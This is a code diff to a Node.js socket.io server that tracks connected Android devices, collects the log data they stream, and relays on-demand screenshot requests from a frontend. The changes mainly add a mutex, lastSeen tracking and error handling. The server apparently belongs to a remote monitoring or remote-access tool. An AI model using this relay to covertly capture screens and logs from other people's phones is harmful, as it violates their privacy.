@@ -13,6 +13,36 @@ const frontendPort = 4001
 let devices = new Map(); // Map<device_uuid, {info: data, socket: socket}>
 let pendingScreenshots = new Map(); // Map<device_uuid, frontend_socket_id>
 
+// Simple mutex for devices map synchronization
+class Mutex {
+    constructor() {
+        this.locked = false;
+        this.waiting = [];
+    }
+
+    async acquire() {
+        return new Promise((resolve) => {
+            if (!this.locked) {
+                this.locked = true;
+                resolve();
+            } else {
+                this.waiting.push(resolve);
+            }
+        });
+    }
+
+    release() {
+        if (this.waiting.length > 0) {
+            const next = this.waiting.shift();
+            next();
+        } else {
+            this.locked = false;
+        }
+    }
+}
+
+const devicesMutex = new Mutex();
+
 // Express
 const app = express()
 app.use(cors())
@@ -50,24 +80,32 @@ androidIo.on("connection", async (socket) => {
 
         socket.deviceUuid = deviceUuid;
 
-        let device = devices.get(deviceUuid);
-        if (device) {
-            // Update existing
-            device.info = data;
-            device.socket = socket;
-            device.connected = true;
-            if (!device.logs) {
-                device.logs = [];
+        // Synchronize access to devices map
+        await devicesMutex.acquire();
+        try {
+            let device = devices.get(deviceUuid);
+            if (device) {
+                // Update existing
+                device.info = data;
+                device.socket = socket;
+                device.connected = true;
+                device.lastSeen = Date.now();
+                if (!device.logs) {
+                    device.logs = [];
+                }
+            } else {
+                // New device
+                device = {
+                    info: data,
+                    socket: socket,
+                    connected: true,
+                    logs: [],
+                    lastSeen: Date.now()
+                };
+                devices.set(deviceUuid, device);
             }
-        } else {
-            // New device
-            device = {
-                info: data,
-                socket: socket,
-                connected: true,
-                logs: []
-            };
-            devices.set(deviceUuid, device);
+        } finally {
+            devicesMutex.release();
         }
 
         // UPSERT device info in DB
@@ -88,35 +126,92 @@ androidIo.on("connection", async (socket) => {
         console.log(chalk.blue(`[i] Status broadcast sent to frontend(s) connected devices)`));
 
         socket.on("disconnect", async () => {
+            // Capture deviceUuid before socket cleanup
             const deviceUuid = socket.deviceUuid;
-            if (deviceUuid) {
-                const device = devices.get(deviceUuid);
-                if (device) {
-                    device.socket = null;
-                    device.connected = false;
+            if (!deviceUuid) {
+                console.log(chalk.yellow(`[!] Device disconnected without UUID`));
+                return;
+            }
+
+            try {
+                // Synchronize access to devices map
+                await devicesMutex.acquire();
+                try {
+                    const device = devices.get(deviceUuid);
+                    if (device) {
+                        device.socket = null;
+                        device.connected = false;
+                        device.lastSeen = Date.now();
+
+                        // Clean up logs to prevent memory leaks (keep only recent 100 entries)
+                        if (device.logs && device.logs.length > 100) {
+                            device.logs = device.logs.slice(-100);
+                        }
+                    }
+
+                    // Update last_seen in DB with proper error handling
+                    const dbResult = await db.run('UPDATE devices SET last_seen = ? WHERE device_uuid = ?', Date.now(), deviceUuid);
+                    if (dbResult.changes === 0) {
+                        console.log(chalk.yellow(`[!] No device found in DB for UUID: ${deviceUuid}`));
+                    }
+
+                    console.log(chalk.redBright(`[x] Device Disconnected (${deviceUuid})`));
+
+                    // Broadcast updated device list to frontends
+                    const deviceList = Array.from(devices.values()).map((d) => ({
+                        ...d.info,
+                        ID: d.info.device_uuid,
+                        connected: d.connected
+                    })).slice(0, 20);
+
+                    frontendIo.emit("info", deviceList);
+                    console.log(chalk.blue(`[i] Status broadcast sent to frontend(s) - ${deviceList.length} connected devices`));
+
+                } finally {
+                    devicesMutex.release();
                 }
 
-                // Update last_seen in DB
-                await db.run('UPDATE devices SET last_seen = ? WHERE device_uuid = ?', Date.now(), deviceUuid).catch(console.error);
-
-                console.log(chalk.redBright(`[x] Device Disconnected (${deviceUuid})`))
-                const deviceList = Array.from(devices.values()).map((d) => ({
-                    ...d.info,
-                    ID: d.info.device_uuid,
-                    connected: d.connected
-                })).slice(0, 20);
-                frontendIo.emit("info", deviceList);
+            } catch (error) {
+                console.error(chalk.red(`[ERROR] Error handling device disconnect for ${deviceUuid}:`), error);
+                // Even if there's an error, try to broadcast the updated list
+                try {
+                    await devicesMutex.acquire();
+                    try {
+                        const deviceList = Array.from(devices.values()).map((d) => ({
+                            ...d.info,
+                            ID: d.info.device_uuid,
+                            connected: d.connected
+                        })).slice(0, 20);
+                        frontendIo.emit("info", deviceList);
+                    } finally {
+                        devicesMutex.release();
+                    }
+                } catch (broadcastError) {
+                    console.error(chalk.red(`[ERROR] Failed to broadcast device list after disconnect error:`), broadcastError);
+                }
             }
         })
 
         socket.on("logger", async (data) => {
             const deviceUuid = socket.deviceUuid;
             if (!deviceUuid) return;
-            const device = devices.get(deviceUuid);
-            if (!device) return;
+
             try {
-                // console.log(`Logger from device ${deviceUuid}: ${data}`);
-                device.logs.push({ timestamp: Date.now(), log: data });
+                // Synchronize access to devices map
+                await devicesMutex.acquire();
+                let device;
+                try {
+                    device = devices.get(deviceUuid);
+                    if (!device) return;
+
+                    // console.log(`Logger from device ${deviceUuid}: ${data}`);
+                    device.logs.push({ timestamp: Date.now(), log: data });
+                    device.lastSeen = Date.now();
+                } finally {
+                    devicesMutex.release();
+                }
+
+                // Emit to frontend
                 frontendIo.emit("logger", { device: deviceUuid, log: data });
 
                 // Incremental storage: Append to daily logs
@@ -142,6 +237,7 @@ androidIo.on("connection", async (socket) => {
         socket.on("screenshot_response", async (data) => {
             const deviceUuid = socket.deviceUuid;
             if (!deviceUuid) return;
+
             try {
                 if (!Buffer.isBuffer(data) && !(data instanceof ArrayBuffer)) {
                     throw new Error('Invalid image data: not a buffer');
@@ -149,6 +245,17 @@ androidIo.on("connection", async (socket) => {
                 const buffer = Buffer.from(data);
                 if (buffer.length === 0) {
                     throw new Error('Empty image data');
+                }
+
+                // Update device last seen
+                await devicesMutex.acquire();
+                try {
+                    const device = devices.get(deviceUuid);
+                    if (device) {
+                        device.lastSeen = Date.now();
+                    }
+                } finally {
+                    devicesMutex.release();
                 }
 
                 // Generate filename with timestamp and device
@@ -187,44 +294,101 @@ androidIo.on("connection", async (socket) => {
 
 // Socket io Connection for Frontends
 const frontendIo = new Server(frontendServer);
-frontendIo.on("connection", (socket) => {
+frontendIo.on("connection", async (socket) => {
     console.log(chalk.greenBright(`[+] Frontend Connected (${socket.id})`))
 
-    const deviceList = Array.from(devices.values()).map((d) => ({
-        ...d.info,
-        ID: d.info.device_uuid,
-        connected: d.connected
-    })).slice(0, 20);
-    socket.emit("info", deviceList);
+    try {
+        await devicesMutex.acquire();
+        try {
+            const deviceList = Array.from(devices.values()).map((d) => ({
+                ...d.info,
+                ID: d.info.device_uuid,
+                connected: d.connected
+            })).slice(0, 20);
+            socket.emit("info", deviceList);
+        } finally {
+            devicesMutex.release();
+        }
+    } catch (error) {
+        console.error('Error sending initial device list to frontend:', error);
+        socket.emit("info", []);
+    }
 
-    socket.on("get_device_logs", (id) => {
-        const device = devices.get(id);
-        if (device && device.logs) {
-            socket.emit("device_logs", device.logs.map(l => l.log));
-        } else {
+    socket.on("get_device_logs", async (id) => {
+        if (!id) {
+            socket.emit("device_logs", []);
+            return;
+        }
+
+        try {
+            await devicesMutex.acquire();
+            try {
+                const device = devices.get(id);
+                if (device && device.logs) {
+                    socket.emit("device_logs", device.logs.map(l => l.log));
+                } else {
+                    socket.emit("device_logs", []);
+                }
+            } finally {
+                devicesMutex.release();
+            }
+        } catch (error) {
+            console.error('Error getting device logs:', error);
             socket.emit("device_logs", []);
         }
     });
 
-    socket.on("screenshot_req", (deviceId) => {
+    socket.on("screenshot_req", async (deviceId) => {
+        if (!deviceId) {
+            console.log(chalk.red(`Screenshot request with invalid deviceId`));
+            return;
+        }
+
         console.log(`Relaying screenshot request to device: ${deviceId}`);
-        const device = devices.get(deviceId);
-        if (device && device.socket) {
-            // Store the mapping between device UUID and frontend socket ID
-            pendingScreenshots.set(deviceId, socket.id);
-            device.socket.emit("screenshot");
-            console.log(chalk.green(`Screenshot request sent to app.`))
-        } else {
-            console.log(chalk.red(`Device ${deviceId} not found or socket disconnected`))
+
+        try {
+            await devicesMutex.acquire();
+            try {
+                const device = devices.get(deviceId);
+                if (device && device.socket && device.connected) {
+                    // Store the mapping between device UUID and frontend socket ID
+                    pendingScreenshots.set(deviceId, socket.id);
+                    device.socket.emit("screenshot");
+                    console.log(chalk.green(`Screenshot request sent to app.`))
+                } else {
+                    console.log(chalk.red(`Device ${deviceId} not found, socket disconnected, or not connected`))
+                    socket.emit("screenshot_error", { device_uuid: deviceId, error: "Device not available" });
+                }
+            } finally {
+                devicesMutex.release();
+            }
+        } catch (error) {
+            console.error('Error handling screenshot request:', error);
+            socket.emit("screenshot_error", { device_uuid: deviceId, error: "Internal server error" });
         }
     });
 
-    socket.on("get_device_info", (deviceId) => {
-        const device = devices.get(deviceId);
-        if (device) {
-            socket.emit("device_info", device.info);
-        } else {
-            socket.emit("device_info_error", { error: "Device not found" });
+    socket.on("get_device_info", async (deviceId) => {
+        if (!deviceId) {
+            socket.emit("device_info_error", { error: "Invalid device ID" });
+            return;
+        }
+
+        try {
+            await devicesMutex.acquire();
+            try {
+                const device = devices.get(deviceId);
+                if (device) {
+                    socket.emit("device_info", device.info);
+                } else {
+                    socket.emit("device_info_error", { error: "Device not found" });
+                }
+            } finally {
+                devicesMutex.release();
+            }
+        } catch (error) {
+            console.error('Error getting device info:', error);
+            socket.emit("device_info_error", { error: "Internal server error" });
         }
     });
 
